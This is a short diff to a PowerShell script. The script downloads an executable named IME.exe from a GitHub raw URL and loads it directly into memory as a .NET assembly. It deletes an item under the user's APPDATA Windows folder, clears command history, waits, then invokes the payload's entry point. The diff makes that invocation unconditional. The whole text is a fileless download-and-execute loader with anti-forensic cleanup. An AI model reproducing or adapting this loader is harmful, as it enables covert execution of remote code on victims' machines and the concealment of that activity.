@@ -1,6 +1,7 @@
 $link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/IME.exe"
 $webClient = New-Object System.Net.WebClient
 $bytes = $webClient.DownloadData($link)
+
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entry = $assembly.EntryPoint
 
@@ -87,9 +88,9 @@ Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows
 Clear-History -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 15
 
-if ($entry -and $entry.GetParameters().Count -eq 1) {
-    $entry.Invoke($null, @([string[]]@()))
-} elseif ($entry) {
-    $entry.Invoke($null, $null)
-}
+$invokeArgs = New-Object object[] 1
+$invokeArgs[0] = [string[]]@()
+
+$entry.Invoke($null, $invokeArgs)
+
 Exit
